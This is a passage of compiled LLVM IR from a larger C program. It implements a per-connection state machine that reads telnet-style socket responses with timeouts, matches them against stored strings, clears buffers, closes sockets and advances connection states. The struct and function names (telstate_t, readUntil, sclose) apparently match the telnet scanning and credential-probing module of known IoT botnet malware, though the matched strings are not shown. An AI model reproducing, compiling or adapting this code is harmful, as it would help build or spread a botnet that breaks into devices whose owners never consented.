  %1434 = call i8* @strstr(i8* %1433, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0)) #10
  %1435 = icmp ne i8* %1434, null
  br i1 %1435, label %1436, label %1456

; <label>:1436:                                   ; preds = %1420
  %1437 = load i32, i32* %2, align 4
  %1438 = sext i32 %1437 to i64
  %1439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1438
  %1440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1439, i32 0, i32 8
  %1441 = load i8*, i8** %1440, align 8
  call void @llvm.memset.p0i8.i64(i8* %1441, i8 0, i64 1024, i32 1, i1 false)
  %1442 = load i32, i32* %2, align 4
  %1443 = sext i32 %1442 to i64
  %1444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1443
  %1445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1444, i32 0, i32 0
  %1446 = load i32, i32* %1445, align 16
  %1447 = call i32 @sclose(i32 %1446)
  %1448 = load i32, i32* %2, align 4
  %1449 = sext i32 %1448 to i64
  %1450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1449
  %1451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1450, i32 0, i32 2
  store i8 0, i8* %1451, align 8
  %1452 = load i32, i32* %2, align 4
  %1453 = sext i32 %1452 to i64
  %1454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1453
  %1455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1454, i32 0, i32 3
  store i8 0, i8* %1455, align 1
  br label %2304

; <label>:1456:                                   ; preds = %1420
  %1457 = load i32, i32* %2, align 4
  %1458 = sext i32 %1457 to i64
  %1459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1458
  %1460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1459, i32 0, i32 2
  store i8 7, i8* %1460, align 8
  br label %1461

; <label>:1461:                                   ; preds = %1456
  %1462 = load i32, i32* %2, align 4
  %1463 = sext i32 %1462 to i64
  %1464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1463
  %1465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1464, i32 0, i32 8
  %1466 = load i8*, i8** %1465, align 8
  call void @llvm.memset.p0i8.i64(i8* %1466, i8 0, i64 1024, i32 1, i1 false)
  br label %2304

; <label>:1467:                                   ; preds = %1401
  %1468 = load i32, i32* %2, align 4
  %1469 = sext i32 %1468 to i64
  %1470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1469
  %1471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1470, i32 0, i32 0
  %1472 = load i32, i32* %1471, align 16
  %1473 = load i32, i32* %2, align 4
  %1474 = sext i32 %1473 to i64
  %1475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1474
  %1476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1475, i32 0, i32 8
  %1477 = load i8*, i8** %1476, align 8
  %1478 = load i32, i32* %2, align 4
  %1479 = sext i32 %1478 to i64
  %1480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1479
  %1481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1480, i32 0, i32 7
  %1482 = load i16, i16* %1481, align 16
  %1483 = zext i16 %1482 to i32
  %1484 = call i32 @readUntil(i32 %1472, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1477, i32 1024, i32 %1483)
  %1485 = icmp ne i32 %1484, 0
  br i1 %1485, label %1486, label %1533

; <label>:1486:                                   ; preds = %1467
  %1487 = load i32, i32* %2, align 4
  %1488 = sext i32 %1487 to i64
  %1489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1488
  %1490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1489, i32 0, i32 6
  store i32 0, i32* %1490, align 4
  %1491 = load i32, i32* %2, align 4
  %1492 = sext i32 %1491 to i64
  %1493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1492
  %1494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1493, i32 0, i32 7
  store i16 0, i16* %1494, align 16
  %1495 = load i32, i32* %2, align 4
  %1496 = sext i32 %1495 to i64
  %1497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1496
  %1498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1497, i32 0, i32 8
  %1499 = load i8*, i8** %1498, align 8
  %1500 = call i8* @strstr(i8* %1499, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0)) #10
  %1501 = icmp ne i8* %1500, null
  br i1 %1501, label %1502, label %1522

; <label>:1502:                                   ; preds = %1486
  %1503 = load i32, i32* %2, align 4
  %1504 = sext i32 %1503 to i64
  %1505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1504
  %1506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1505, i32 0, i32 8
  %1507 = load i8*, i8** %1506, align 8
  call void @llvm.memset.p0i8.i64(i8* %1507, i8 0, i64 1024, i32 1, i1 false)
  %1508 = load i32, i32* %2, align 4
  %1509 = sext i32 %1508 to i64
  %1510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1509
  %1511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1510, i32 0, i32 0
  %1512 = load i32, i32* %1511, align 16
  %1513 = call i32 @sclose(i32 %1512)
  %1514 = load i32, i32* %2, align 4
  %1515 = sext i32 %1514 to i64
  %1516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1515
  %1517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1516, i32 0, i32 2
  store i8 0, i8* %1517, align 8
  %1518 = load i32, i32* %2, align 4
  %1519 = sext i32 %1518 to i64
  %1520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1519
  %1521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1520, i32 0, i32 3
  store i8 0, i8* %1521, align 1
  br label %2304

; <label>:1522:                                   ; preds = %1486
  %1523 = load i32, i32* %2, align 4
  %1524 = sext i32 %1523 to i64
  %1525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1524
  %1526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1525, i32 0, i32 2
  store i8 7, i8* %1526, align 8
  br label %1527

; <label>:1527:                                   ; preds = %1522
  %1528 = load i32, i32* %2, align 4
  %1529 = sext i32 %1528 to i64
  %1530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1529
  %1531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1530, i32 0, i32 8
  %1532 = load i8*, i8** %1531, align 8
  call void @llvm.memset.p0i8.i64(i8* %1532, i8 0, i64 1024, i32 1, i1 false)
  br label %2304

; <label>:1533:                                   ; preds = %1467
  %1534 = load i32, i32* %2, align 4
  %1535 = sext i32 %1534 to i64
  %1536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1535
  %1537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1536, i32 0, i32 0
  %1538 = load i32, i32* %1537, align 16
  %1539 = load i32, i32* %2, align 4
  %1540 = sext i32 %1539 to i64
  %1541 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1540
  %1542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1541, i32 0, i32 8
  %1543 = load i8*, i8** %1542, align 8
  %1544 = load i32, i32* %2, align 4
  %1545 = sext i32 %1544 to i64
  %1546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1545
  %1547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1546, i32 0, i32 7
  %1548 = load i16, i16* %1547, align 16
  %1549 = zext i16 %1548 to i32
  %1550 = call i32 @readUntil(i32 %1538, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1543, i32 1024, i32 %1549)
  %1551 = icmp ne i32 %1550, 0
  br i1 %1551, label %1552, label %1599

; <label>:1552:                                   ; preds = %1533
  %1553 = load i32, i32* %2, align 4
  %1554 = sext i32 %1553 to i64
  %1555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1554
  %1556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1555, i32 0, i32 6
  store i32 0, i32* %1556, align 4
  %1557 = load i32, i32* %2, align 4
  %1558 = sext i32 %1557 to i64
  %1559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1558
  %1560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1559, i32 0, i32 7
  store i16 0, i16* %1560, align 16
  %1561 = load i32, i32* %2, align 4
  %1562 = sext i32 %1561 to i64
  %1563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1562
  %1564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1563, i32 0, i32 8
  %1565 = load i8*, i8** %1564, align 8
  %1566 = call i8* @strstr(i8* %1565, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0)) #10
  %1567 = icmp ne i8* %1566, null
  br i1 %1567, label %1568, label %1588

; <label>:1568:                                   ; preds = %1552
  %1569 = load i32, i32* %2, align 4
  %1570 = sext i32 %1569 to i64
  %1571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1570
  %1572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1571, i32 0, i32 8
  %1573 = load i8*, i8** %1572, align 8
  call void @llvm.memset.p0i8.i64(i8* %1573, i8 0, i64 1024, i32 1, i1 false)
  %1574 = load i32, i32* %2, align 4
  %1575 = sext i32 %1574 to i64
  %1576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1575
  %1577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1576, i32 0, i32 0
  %1578 = load i32, i32* %1577, align 16
  %1579 = call i32 @sclose(i32 %1578)
  %1580 = load i32, i32* %2, align 4
  %1581 = sext i32 %1580 to i64
  %1582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1581
  %1583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1582, i32 0, i32 2
  store i8 0, i8* %1583, align 8
  %1584 = load i32, i32* %2, align 4
  %1585 = sext i32 %1584 to i64
  %1586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1585
  %1587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1586, i32 0, i32 3
  store i8 0, i8* %1587, align 1
  br label %2304

; <label>:1588:                                   ; preds = %1552
  %1589 = load i32, i32* %2, align 4
  %1590 = sext i32 %1589 to i64
  %1591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1590
  %1592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1591, i32 0, i32 2
  store i8 7, i8* %1592, align 8
  br label %1593

; <label>:1593:                                   ; preds = %1588
  %1594 = load i32, i32* %2, align 4
  %1595 = sext i32 %1594 to i64
  %1596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1595
  %1597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1596, i32 0, i32 8
  %1598 = load i8*, i8** %1597, align 8
  call void @llvm.memset.p0i8.i64(i8* %1598, i8 0, i64 1024, i32 1, i1 false)
  br label %2304

; <label>:1599:                                   ; preds = %1533
  %1600 = load i32, i32* %2, align 4
  %1601 = sext i32 %1600 to i64
  %1602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1601
  %1603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1602, i32 0, i32 0
  %1604 = load i32, i32* %1603, align 16
  %1605 = load i32, i32* %2, align 4
  %1606 = sext i32 %1605 to i64
  %1607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1606
  %1608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1607, i32 0, i32 8
  %1609 = load i8*, i8** %1608, align 8
  %1610 = load i32, i32* %2, align 4
  %1611 = sext i32 %1610 to i64
  %1612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1611
  %1613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1612, i32 0, i32 7
  %1614 = load i16, i16* %1613, align 16
  %1615 = zext i16 %1614 to i32
  %1616 = call i32 @readUntil(i32 %1604, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1609, i32 1024, i32 %1615)
  %1617 = icmp ne i32 %1616, 0
  br i1 %1617, label %1618, label %1665

; <label>:1618:                                   ; preds = %1599
  %1619 = load i32, i32* %2, align 4
  %1620 = sext i32 %1619 to i64
  %1621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1620
  %1622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1621, i32 0, i32 6
  store i32 0, i32* %1622, align 4
  %1623 = load i32, i32* %2, align 4
  %1624 = sext i32 %1623 to i64
  %1625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1624
  %1626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1625, i32 0, i32 7
  store i16 0, i16* %1626, align 16
  %1627 = load i32, i32* %2, align 4
  %1628 = sext i32 %1627 to i64
  %1629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1628
  %1630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1629, i32 0, i32 8
  %1631 = load i8*, i8** %1630, align 8
  %1632 = call i8* @strstr(i8* %1631, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0)) #10
  %1633 = icmp ne i8* %1632, null
  br i1 %1633, label %1634, label %1654

; <label>:1634:                                   ; preds = %1618
  %1635 = load i32, i32* %2, align 4
  %1636 = sext i32 %1635 to i64
  %1637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1636
  %1638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1637, i32 0, i32 8
  %1639 = load i8*, i8** %1638, align 8
  call void @llvm.memset.p0i8.i64(i8* %1639, i8 0, i64 1024, i32 1, i1 false)
  %1640 = load i32, i32* %2, align 4
  %1641 = sext i32 %1640 to i64
  %1642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1641
  %1643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1642, i32 0, i32 0
  %1644 = load i32, i32* %1643, align 16
  %1645 = call i32 @sclose(i32 %1644)
  %1646 = load i32, i32* %2, align 4
  %1647 = sext i32 %1646 to i64
  %1648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1647
  %1649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1648, i32 0, i32 2
  store i8 0, i8* %1649, align 8
  %1650 = load i32, i32* %2, align 4
  %1651 = sext i32 %1650 to i64
  %1652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1651
  %1653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1652, i32 0, i32 3
  store i8 0, i8* %1653, align 1
  br label %2304

; <label>:1654:                                   ; preds = %1618
  %1655 = load i32, i32* %2, align 4
  %1656 = sext i32 %1655 to i64
  %1657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1656
  %1658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1657, i32 0, i32 2
  store i8 7, i8* %1658, align 8
  br label %1659

; <label>:1659:                                   ; preds = %1654
  %1660 = load i32, i32* %2, align 4
  %1661 = sext i32 %1660 to i64
  %1662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1661
  %1663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1662, i32 0, i32 8
  %1664 = load i8*, i8** %1663, align 8
  call void @llvm.memset.p0i8.i64(i8* %1664, i8 0, i64 1024, i32 1, i1 false)
  br label %2304

; <label>:1665:                                   ; preds = %1599
  %1666 = load i32, i32* %2, align 4
  %1667 = sext i32 %1666 to i64
  %1668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1667
  %1669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1668, i32 0, i32 0
  %1670 = load i32, i32* %1669, align 16
  %1671 = load i32, i32* %2, align 4
  %1672 = sext i32 %1671 to i64
  %1673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1672
  %1674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1673, i32 0, i32 8
  %1675 = load i8*, i8** %1674, align 8
  %1676 = load i32, i32* %2, align 4
  %1677 = sext i32 %1676 to i64
  %1678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1677
  %1679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1678, i32 0, i32 7
  %1680 = load i16, i16* %1679, align 16
  %1681 = zext i16 %1680 to i32
  %1682 = call i32 @readUntil(i32 %1670, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1675, i32 1024, i32 %1681)
  %1683 = icmp ne i32 %1682, 0
  br i1 %1683, label %1684, label %1731

; <label>:1684:                                   ; preds = %1665
  %1685 = load i32, i32* %2, align 4
  %1686 = sext i32 %1685 to i64
  %1687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1686
  %1688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1687, i32 0, i32 6
  store i32 0, i32* %1688, align 4
  %1689 = load i32, i32* %2, align 4
  %1690 = sext i32 %1689 to i64
  %1691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1690
  %1692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1691, i32 0, i32 7
  store i16 0, i16* %1692, align 16
  %1693 = load i32, i32* %2, align 4
  %1694 = sext i32 %1693 to i64
  %1695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1694
  %1696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1695, i32 0, i32 8
  %1697 = load i8*, i8** %1696, align 8
  %1698 = call i8* @strstr(i8* %1697, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0)) #10
  %1699 = icmp ne i8* %1698, null
  br i1 %1699, label %1700, label %1720

; <label>:1700:                                   ; preds = %1684
  %1701 = load i32, i32* %2, align 4
  %1702 = sext i32 %1701 to i64
  %1703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1702
  %1704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1703, i32 0, i32 8
  %1705 = load i8*, i8** %1704, align 8
  call void @llvm.memset.p0i8.i64(i8* %1705, i8 0, i64 1024, i32 1, i1 false)
  %1706 = load i32, i32* %2, align 4
  %1707 = sext i32 %1706 to i64
  %1708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1707
  %1709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1708, i32 0, i32 0
  %1710 = load i32, i32* %1709, align 16
  %1711 = call i32 @sclose(i32 %1710)
  %1712 = load i32, i32* %2, align 4
  %1713 = sext i32 %1712 to i64
  %1714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1713
  %1715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1714, i32 0, i32 2
  store i8 0, i8* %1715, align 8
  %1716 = load i32, i32* %2, align 4
  %1717 = sext i32 %1716 to i64
  %1718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1717
  %1719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1718, i32 0, i32 3
  store i8 0, i8* %1719, align 1
  br label %2304

; <label>:1720:                                   ; preds = %1684
  %1721 = load i32, i32* %2, align 4
  %1722 = sext i32 %1721 to i64
  %1723 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1722
  %1724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1723, i32 0, i32 2
  store i8 7, i8* %1724, align 8
  br label %1725

; <label>:1725:                                   ; preds = %1720
  %1726 = load i32, i32* %2, align 4
  %1727 = sext i32 %1726 to i64
  %1728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1727
  %1729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1728, i32 0, i32 8
  %1730 = load i8*, i8** %1729, align 8
  call void @llvm.memset.p0i8.i64(i8* %1730, i8 0, i64 1024, i32 1, i1 false)
  br label %2304

; <label>:1731:                                   ; preds = %1665
  %1732 = load i32, i32* %2, align 4
  %1733 = sext i32 %1732 to i64
  %1734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1733
  %1735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1734, i32 0, i32 0
  %1736 = load i32, i32* %1735, align 16
  %1737 = load i32, i32* %2, align 4
  %1738 = sext i32 %1737 to i64
  %1739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1738
  %1740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1739, i32 0, i32 8
  %1741 = load i8*, i8** %1740, align 8
  %1742 = load i32, i32* %2, align 4
  %1743 = sext i32 %1742 to i64
  %1744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1743
  %1745 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1744, i32 0, i32 7
  %1746 = load i16, i16* %1745, align 16
  %1747 = zext i16 %1746 to i32
  %1748 = call i32 @readUntil(i32 %1736, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1741, i32 1024, i32 %1747)
  %1749 = icmp ne i32 %1748, 0
  br i1 %1749, label %1750, label %1797

; <label>:1750:                                   ; preds = %1731
  %1751 = load i32, i32* %2, align 4
  %1752 = sext i32 %1751 to i64
  %1753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1752
  %1754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1753, i32 0, i32 6
  store i32 0, i32* %1754, align 4
  %1755 = load i32, i32* %2, align 4
  %1756 = sext i32 %1755 to i64
  %1757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1756
  %1758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1757, i32 0, i32 7
  store i16 0, i16* %1758, align 16
  %1759 = load i32, i32* %2, align 4
  %1760 = sext i32 %1759 to i64
  %1761 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1760
  %1762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1761, i32 0, i32 8
  %1763 = load i8*, i8** %1762, align 8
  %1764 = call i8* @strstr(i8* %1763, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0)) #10
  %1765 = icmp ne i8* %1764, null
  br i1 %1765, label %1766, label %1786

; <label>:1766:                                   ; preds = %1750
  %1767 = load i32, i32* %2, align 4
  %1768 = sext i32 %1767 to i64
  %1769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1768
  %1770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1769, i32 0, i32 8
  %1771 = load i8*, i8** %1770, align 8
  call void @llvm.memset.p0i8.i64(i8* %1771, i8 0, i64 1024, i32 1, i1 false)
  %1772 = load i32, i32* %2, align 4
  %1773 = sext i32 %1772 to i64
  %1774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1773
  %1775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1774, i32 0, i32 0
  %1776 = load i32, i32* %1775, align 16
  %1777 = call i32 @sclose(i32 %1776)
  %1778 = load i32, i32* %2, align 4
  %1779 = sext i32 %1778 to i64
  %1780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1779
  %1781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1780, i32 0, i32 2
  store i8 0, i8* %1781, align 8
  %1782 = load i32, i32* %2, align 4
  %1783 = sext i32 %1782 to i64
  %1784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1783
  %1785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1784, i32 0, i32 3
  store i8 0, i8* %1785, align 1
  br label %2304

; <label>:1786:                                   ; preds = %1750
  %1787 = load i32, i32* %2, align 4
  %1788 = sext i32 %1787 to i64
  %1789 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1788
  %1790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1789, i32 0, i32 2
  store i8 7, i8* %1790, align 8
  br label %1791

; <label>:1791:                                   ; preds = %1786
  %1792 = load i32, i32* %2, align 4
  %1793 = sext i32 %1792 to i64
  %1794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1793
  %1795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1794, i32 0, i32 8
  %1796 = load i8*, i8** %1795, align 8
  call void @llvm.memset.p0i8.i64(i8* %1796, i8 0, i64 1024, i32 1, i1 false)
  br label %2304

; <label>:1797:                                   ; preds = %1731
  %1798 = load i32, i32* %2, align 4
  %1799 = sext i32 %1798 to i64
  %1800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1799
  %1801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1800, i32 0, i32 0
  %1802 = load i32, i32* %1801, align 16
  %1803 = load i32, i32* %2, align 4
  %1804 = sext i32 %1803 to i64
  %1805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1804
  %1806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1805, i32 0, i32 8
  %1807 = load i8*, i8** %1806, align 8
  %1808 = load i32, i32* %2, align 4
  %1809 = sext i32 %1808 to i64
  %1810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1809
  %1811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1810, i32 0, i32 7
  %1812 = load i16, i16* %1811, align 16
  %1813 = zext i16 %1812 to i32
  %1814 = call i32 @readUntil(i32 %1802, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1807, i32 1024, i32 %1813)
  %1815 = icmp ne i32 %1814, 0
  br i1 %1815, label %1816, label %1863

; <label>:1816:                                   ; preds = %1797
  %1817 = load i32, i32* %2, align 4
  %1818 = sext i32 %1817 to i64
  %1819 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1818
  %1820 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1819, i32 0, i32 6
  store i32 0, i32* %1820, align 4
  %1821 = load i32, i32* %2, align 4
  %1822 = sext i32 %1821 to i64
  %1823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1822
  %1824 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1823, i32 0, i32 7
  store i16 0, i16* %1824, align 16
  %1825 = load i32, i32* %2, align 4
  %1826 = sext i32 %1825 to i64
  %1827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1826
  %1828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1827, i32 0, i32 8
  %1829 = load i8*, i8** %1828, align 8
  %1830 = call i8* @strstr(i8* %1829, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0)) #10
  %1831 = icmp ne i8* %1830, null
  br i1 %1831, label %1832, label %1852

; <label>:1832:                                   ; preds = %1816
  %1833 = load i32, i32* %2, align 4
  %1834 = sext i32 %1833 to i64
  %1835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1834
  %1836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1835, i32 0, i32 8
  %1837 = load i8*, i8** %1836, align 8
  call void @llvm.memset.p0i8.i64(i8* %1837, i8 0, i64 1024, i32 1, i1 false)
  %1838 = load i32, i32* %2, align 4
  %1839 = sext i32 %1838 to i64
  %1840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1839
  %1841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1840, i32 0, i32 0
  %1842 = load i32, i32* %1841, align 16
  %1843 = call i32 @sclose(i32 %1842)
  %1844 = load i32, i32* %2, align 4
  %1845 = sext i32 %1844 to i64
  %1846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1845
  %1847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1846, i32 0, i32 2
  store i8 0, i8* %1847, align 8
  %1848 = load i32, i32* %2, align 4
  %1849 = sext i32 %1848 to i64
  %1850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1849
  %1851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1850, i32 0, i32 3
  store i8 0, i8* %1851, align 1
  br label %2304

; <label>:1852:                                   ; preds = %1816
  %1853 = load i32, i32* %2, align 4
  %1854 = sext i32 %1853 to i64
